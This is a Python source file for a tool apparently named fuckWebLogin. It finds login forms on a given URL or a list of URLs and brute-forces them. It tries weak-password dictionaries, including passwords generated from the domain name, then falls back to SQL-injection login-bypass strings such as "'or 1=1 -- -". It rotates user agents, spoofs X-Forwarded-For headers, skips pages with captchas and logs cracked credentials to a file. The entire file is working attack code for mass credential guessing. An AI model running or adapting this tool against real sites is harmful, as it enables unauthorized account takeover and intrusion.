'''
type: python3
author: warmilk
github: https://github.com/warmilk/fuckWebLogin
'''

import json
from urllib.parse import urlparse
from bs4 import BeautifulSoup as BS
import time
import requests
import os
import sys
import re
import random
import urllib
import datetime
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

slogan = '''
*****************************************************
**************     ❤ fuckWebLogin ❤ 邓强龙   ********
*****************************************************
'''


# 读取cms.json的配置并处理
with open('cms_list.json', 'r', encoding="utf-8") as JsonFile:
    data = JsonFile.read()
    cms_list = json.loads(data) # json.loads( )将cms.json里放着的JavaScript 的 array 解码为 Python 的 list
    cms_kind_count = len(cms_list)


# 以下特征值用于检测页面是否为登录页
login_flag_list = ['用户名', '密码', 'login','Login', 'denglu', '登录', 'user', 'pass', 'yonghu', 'mima'] 
search_flag_list = ['检索', '搜', 'search', '查找', 'keyword', '关键字']
captchas_flag_list = ['验证码', '验 证 码', '点击更换', '点击刷新', '看不清', '认证码', '安全问题']


input_tag_username_attr_list = ['user', 'name', 'username', 'phone', 'mobile', 'zhanghao', 'yonghu', 'email', 'account'] #input标签常用的账号框的id或name属性值
input_tag_password_attr_list = ['pass', 'pw', 'mima', 'password'] #input标签常用的密码框的id或name属性值


static_username_dic = ['admin', 'root', 'adminadmin']
static_password_dic = ['{username}', '123456', '{username}888', '12345678', '123123',  '88888888', '888888', 'password', '123456a', '{username}123', '{username}123456', '{username}666', '{username}2018', '123456789', '654321', '666666', '66666666', '1234567890', '8888888', '987654321', '0123456789', '12345', '1234567', '000000', '111111', '5201314', '123123']

suffix_dic = ['', '123', '888', '666', '123456', 'abc']  #弱密码常用的后缀，suffix（后缀）


# 万能账号/密码
powerful_username_dic = ["admin' or 'a'='a", "'or'='or'", "admin' or '1'='1' or 1=1", "')or('a'='a", "'or 1=1 -- -"]
powerful_password_dic =powerful_username_dic



log_file = 'fuck_log.txt'
success_file = 'fuck_success.txt'
faild_file = 'fuck_faild.txt'




# 获取客户端时间并格式化输出
def get_time():
    return time.strftime('%Y-%m-%d %X', time.localtime(time.time()))

# 将动态生成的密码字典混入静态的字典内
def mixin_dic(url):
    mixin_password_dic = []
    mixin_password_dic = gen_dynam_password_dic(url)
    static_password_dic.extend(mixin_password_dic)
    return static_username_dic, static_password_dic



# 动态地生成password字典
def gen_dynam_password_dic(url):
    dynam_password_dic = []
    tmp_dic = []
    list1 = url.split('/')
    host = list1[2].split(":")[0]
    compile_ip = re.compile(
        '^(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)$')
    if compile_ip.match(host):
        check_ip = 1
    else:
        check_ip = 0
    if not check_ip:
        list2 = host.split(".")
        i = len(list2)
        for u in range(i):  # 生成url字典1
            list3 = list2[u:]
            part = '.'.join(list3)
            if (len(part) < 5):
                continue
            dynam_password_dic.append(part)
        for u in range(i):  # 生成url字典2
            list3 = list2[u]
            if len(list3) < 5:
                continue
            tmp_dic.append(list3)
        for i in tmp_dic:
            for suffix in suffix_dic:
                u = i + suffix
                dynam_password_dic.append(u)
        return dynam_password_dic
    else:
        return ''


def requests_proxies():
    proxies = {
        #    'http':'127.0.0.1:8080',
        #    'https':'127.0.0.1:8080'
    }
    return proxies


# 生成随机headers
def random_headers():
    user_agent = ['Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.6 Safari/532.0',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1 ; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre',
                  'Opera/10.60 (Windows NT 5.1; U; zh-cn) Presto/2.6.30 Version/10.60',
                  'Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4062; en; U; ssr)',
                  'Mozilla/5.0 (Windows; U; Windows NT 5.1; ; rv:1.9.0.14) Gecko/2009082707 Firefox/3.0.14',
                  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr; rv:1.9.2.4) Gecko/20100523 Firefox/3.6.4 ( .NET CLR 3.5.30729)',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
                  'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5']
    UA = random.choice(user_agent)
    a = str(random.randint(1, 255))
    b = str(random.randint(1, 255))
    c = str(random.randint(1, 255))
    random_XFF = '127.' + a + '.' + b + '.' + c
    random_CI = '127.' + c + '.' + a + '.' + b
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'User-Agent': UA,
        'X-Forwarded-For': random_XFF,
        'Client-IP': random_CI,
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.8',
        "Referer": "http://www.baidu.com/",
        'Content-Type': 'application/x-www-form-urlencoded'}
    return headers


# 用爆破出来的账号密码组合去尝试登录，验证结果正确性
def recheck(path, data, username, password):
    data1 = data
    connection = requests.session()
    password = str(password.replace('{username}', username))

    data_test = str(data1.replace('%7Buser_name%7D', 'admin'))
    data_test = str(data_test.replace('%7Bpass_word%7D', 'length_test'))

    data2 = str(data1.replace('%7Buser_name%7D', username))
    data2 = str(data2.replace('%7Bpass_word%7D', password))
    res_test = connection.post(url=path, data=data_test, headers=random_headers(), timeout=20, verify=False,
                         allow_redirects=True, proxies=requests_proxies())  # 预请求
    res_01 = connection.post(url=path, data=data_test, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())
    res_02 = connection.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())
    res_01.encoding = res_01.apparent_encoding
    res_02.encoding = res_02.apparent_encoding
    error_length_01 = len(res_01.text+str(res_01.headers))
    error_length_02 = len(res_02.text+str(res_02.headers))

    if error_length_01 == error_length_02 or res_02.status_code == 403:
        return 0
    else:
        return 1


def get_post_path(content, url):
    form_action = str(content).split('\n')[0]
    soup = BS(form_action, "lxml")
    res = urlparse(url)
    path = ''
    action_path = soup.form['action']

    if action_path.startswith('http'):
        path = action_path
    elif action_path.startswith('/'):
        root_path = res.scheme+'://'+res.netloc
        path = root_path+action_path
    else:
        relative_path = url.rstrip(url.split('/')[-1])
        path = relative_path+action_path
    return path




def get_error_length(connection, path, data):
    data1 = data
    dynamic_req_len = 0
    data2 = str(data1.replace('%7Buser_name%7D', 'admin'))
    data2 = str(data2.replace('%7Bpass_word%7D', 'length_test'))
    res_test = connection.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                         allow_redirects=True, proxies=requests_proxies())  # 先请求一次
    res_02 = connection.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                       allow_redirects=True, proxies=requests_proxies())
    res_02.encoding = res_02.apparent_encoding
    res = connection.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False, allow_redirects=True,
                    proxies=requests_proxies())
    res.encoding = res.apparent_encoding
    error_length_02 = len(res_02.text+str(res_02.headers))
    error_length = len(res.text+str(res.headers))
    if error_length_02 != error_length:
        dynamic_req_len = 1
    return error_length, dynamic_req_len


# 万能爆破模块
def crack(path, data, username_dic, password_dic, username_key, password_key, cms_index):
    try:
        connection = requests.session()
        error_length, dynamic_req_len = get_error_length(connection, path, data)
        if dynamic_req_len:
            return False, False
        num = 0
        success_flag = 0
        dic_all = len(username_dic) * len(password_dic)
        if not dic_all:
            return False, False
        fail_keywords_list = ['密码错误', '重试', '不正确', '密码有误', '不成功', '重新输入', '不存在', '登录失败', '登陆失败', '密码或安全问题错误', 'history.go', 'history.back', '已被锁定', '安全拦截', '还可以尝试', '无效', '攻击行为', '创宇盾', 'http://zhuji.360.cn/guard/firewall/stopattack.html', 'D盾_拦截提示', '用户不存在', '非法', '百度云加速', '安全威胁', '防火墙', '黑客', '不合法', 'Denied', '尝试次数', 'http://safe.webscan.360.cn/stopattack.html']
        for username in username_dic:
            for password in password_dic:
                is_right_password = 1
                data1 = data
                password = password.replace('{username}', username)
                data2 = data1.replace(
                    '%7Buser_name%7D', urllib.parse.quote(username))
                data2 = data2.replace(
                    '%7Bpass_word%7D', urllib.parse.quote(password))
                num = num + 1
                #print('URL: ',path,"字典总数：", dic_all, " 当前尝试：", num, " checking:", username, password)
                print("账号/密码组合总数：", dic_all, " 当前尝试：", num,
                      " 账号/密码:", username, password)
                res = connection.post(url=path, data=data2, headers=random_headers(), timeout=20, verify=False,
                                allow_redirects=True, proxies=requests_proxies())
                # time.sleep(0.5)
                res.encoding = res.apparent_encoding
                html = res.text+str(res.headers)
                if cms_index and cms_list[cms_index]['success_flag']:
                    if cms_list[cms_index]['success_flag'] in html:
                        success_flag = 1
                        return username, password
                elif cms_index and cms_list[cms_index]['fail_flag']:
                    if cms_list[cms_index]['fail_flag'] in html:
                        return False, False
                    else:
                        continue
                else:
                    for i in fail_keywords_list:
                        if i in html:
                            is_right_password = 0
                            break
                    if is_right_password:
                        cur_length = len(res.text + str(res.headers))
                        if username_key:
                            if username_key in res.text:
                                continue
                            elif password_key:
                                if password_key in res.text:
                                    continue
                        if cur_length != error_length:
                            success_flag = 1
                            return username, password
                    else:
                        continue
        if success_flag == 0:
            return False, False
    except Exception as e:
        start = datetime.datetime.now()
        with open(faild_file, 'a+') as error_log:
            error_log.write(str(start) + str(e) + '\n')
        print(start, e)



def get_data(url, form):
    data = {}
    captcha = 0
    username_key = ''
    password_key = ''
    for input_node in form.find_all('input'):
        ok_flag = 0
        if input_node.has_attr('name'):
            username_param = input_node['name']
        elif input_node.has_attr('id'):
            username_param = input_node['id']
        else:
            username_param = ''
        if input_node.has_attr('value'):
            password_param = input_node['value']
        else:
            password_param = '0000'
        if username_param:
            if not username_key:
                for z in input_tag_username_attr_list:
                    if z in username_param.lower():
                        password_param = '{username}'
                        username_key = username_param
                        ok_flag = 1
                        break
            if not ok_flag:
                for y in input_tag_password_attr_list:
                    if y in username_param.lower():
                        password_param = '{password}'
                        password_key = username_param
                        ok_flag = 1
                        break
            data[username_param] = str(password_param)

    for i in ['reset']:
        for r in list(data.keys()):
            if i in r.lower():
                data.pop(r)

    if username_key and password_key:
        return username_key, password_key, str(urllib.parse.urlencode(data))
    else:
        return False, False, False



# 根据 【页面的html  + cms.json的keywords关键字数组】做匹配对比，识别cms种类，返回 cms_index
def get_cms_index(html):
    for cms_index in range(cms_kind_count):
        keyword = cms_list[cms_index]['keywords']
        if keyword and keyword in html:
            print("识别到cms:", cms_list[cms_index]['name'])
            if cms_list[cms_index]['alert']:
                print(cms_list[cms_index]['note'])
            return cms_index
    # print("未识别出当前所使用cms")
    return 0


# 根据【form_content + 预设的数组】比对判断页面是否是登录页
def verify_login_page(url, form_content, title, cms_index):
    for i in search_flag_list:
        if i in form_content:
            print("[-] 这可能是个搜索页面哦:", title, url)
            with open(log_file, 'a+') as log:
                log.write("[-] 这可能是个搜索页面哦:" + url + '\n')
            form_content = ''

    login_flag = 0
    if form_content:
        for login in login_flag_list:
            if login in str(form_content):
                login_flag = 1
                break
        if login_flag == 0:
            print("[-] 这个页面或许不是登录页哦:", title, url)
            with open(log_file, 'a+') as log:
                log.write("[-] 这个页面或许不是登录页哦:"+url + '\n')
            form_content = ''
    return form_content, cms_index


# 有验证码就退出爆破，没验证码就构造表单form_content
def get_form_and_cms_index(url):
    url1 = url.strip()
    header = random_headers()
    res = requests.get(url1, timeout=20, verify=False, headers=header)
    # res.apparent_encoding  是从内容中分析出的response的编码方式
    res.encoding = res.apparent_encoding
    html = res.text  # res.text 为字符串方式的响应体，会自动根据响应头部的字符编码进行解码
    cms_index = get_cms_index(html)  # 根据页面的HTML内容，判断cms的类型
    # beautifulSoup靓汤，bs是一个用来从HTML或者XML中提取数据的库，源HTML就是一锅乱炖的汤，用了lxml这个解析库之后，就可以通过soup.tagName的方式去获取到HTML的dom节点的数据
    all_soup = BS(html, "lxml")

    # 先判断是否是预设的cms类型，并且该cms存在验证码，就退出爆破
    if cms_index and cms_list[cms_index]['captcha'] == 1:
        print("[-] 该" + cms_list[cms_index]["name"] +
              "登录页面存在验证码: " + url + '\n', get_time())
        with open(log_file, 'a+') as log:
            log.write("[-] 该" + cms_list[cms_index]
                      ["name"] + "登录页面存在验证码: " + url + '\n')
        return '', '', ''
    else:
        if not cms_index:
            for captcha in captchas_flag_list:
                if captcha in html:
                    print("[-]" + captcha, get_time())
                    with open(log_file, 'a+') as log:
                        log.write("[-]" + captcha + url + '\n')
                    return '', '', ''
    try:
        title = all_soup.title.text
    except:
        title = ''
    # re.findall(pattern, string, flags=0) 如果匹配模式中包含分组，则返回分组，如果有多个分组，则返回分组组成的元组，re是Python的正则表达式的解析库
    result = re.findall(".*<form (.*)</form>.*", html, re.S)
    form_data = ''
    form_content = ''
    if result:
        form_data = '<form ' + result[0] + ' </form>'
        form_soup = BS(form_data, "lxml")
        form_content = form_soup.form

    form_content_result, cms_index_result = verify_login_page(url, form_content, title, cms_index)
    return form_content_result, cms_index_result



# 弱密码尝试爆破模块入口
def fuck(url):
    try:
        form_content, cms_index = get_form_and_cms_index(url)
        if cms_index:
            exp_able = cms_list[cms_index]['exp_able']  # "exp_able":"是否启用万能密码模块爆破"
        else:
            exp_able = 1
        if form_content:
            username_key, password_key, data = get_data(url, form_content)
            if data:
                print("开始使用弱账号/弱密码组合尝试爆破 :", url, get_time())
                path = get_post_path(form_content, url)
                username_dic, password_dic = mixin_dic(url)
                username, password = crack( path, data, username_dic, password_dic, username_key, password_key, cms_index)
                recheck_flag = 1
                if username:
                    print("爆破成功，开始再次登录，以验证爆破结果的 账号/密码 正确性...", url, username, password)
                    recheck_flag = recheck(path, data, username, password)
                else:
                    if exp_able:
                        username_dic =powerful_username_dic
                        password_dic = powerful_password_dic
                        print('弱密码组合尝试完毕，开始启动万能密码爆破模块.....')
                        username, password = crack(
                            path, data, username_dic, password_dic, username_key, password_key, cms_index)
                        if username:
                            print("爆破成功，开始再次登录，以验证爆破结果的 账号/密码 正确性......", url,
                                  username, password)
                            recheck_flag = recheck(
                                path, data, username, password)
                        else:
                            recheck_flag = 0
                    else:
                        recheck_flag = 0

                if recheck_flag:
                    with open(log_file, 'a+') as log:
                        log.write("[+] Success :" + url + '          ' +
                                  username + '/' + password + '\n')
                    with open(success_file, 'a+') as oklog:
                        oklog.write(url + '          ' +
                                    username + '/' + password + '\n')
                    print("[+] Success :", url, " user/pass",
                          username + '/' + password)
                else:
                    print("[-] Faild :", url, get_time())
                    with open(log_file, 'a+') as log:
                        log.write("[-] Faild :"+url + '\n')
    except Exception as e:
        start = datetime.datetime.now()
        with open(faild_file, 'a+') as error_log:
            error_log.write(str(start) + '\n' + str(e) + '\n\n')
        print(start, e)


if __name__ == "__main__":
    print(slogan)
    url_or_file = input('请输入文件名或者域名（不输入则默认使用项目目录下的url.txt。确认请按enter键）:')
    if url_or_file == '':
        url_or_file = 'url.txt'
    now = get_time()
    try:
        # 单域名爆破
        if '://' in url_or_file:
            fuck(url_or_file)
        # 文件爆破
        else:
            url_list = []
            if os.path.exists(url_or_file):
                print("\n已经在当前目录下找到" + url_or_file + "文件")
                print("开始逐行读取" + url_or_file + "...")
                with open(url_or_file, 'r') as url_file:
                    for url in url_file.readlines():
                        url = url.strip()  # strip用于去空格操作
                        # if url.startswith('#') or  url=='' or ('.edu.cn' in url) or ('.gov.cn' in url) :
                        if url.startswith('#') or url == '':
                            continue
                        url_list.append(url)
                url_total_count = len(url_list)
                current_num = 0
                print("读取完毕！总任务数:", url_total_count, "，开始串行启动弱密码爆破任务...\n")
                for url in url_list:
                    print("\n" + "[" + str(current_num + 1)+"/" +
                          str(url_total_count)+"]", url_list[current_num])
                    fuck(url)
                    current_num += 1
            else:
                print("\n当前目录下找不到" + url_or_file + "这个文件！\n")
                exit(0)
    except Exception as e:
        start = datetime.datetime.now()
        with open(faild_file, 'a+') as error_log:
            error_log.write(str(start) + str(e) + '\n')
        print(start, e)
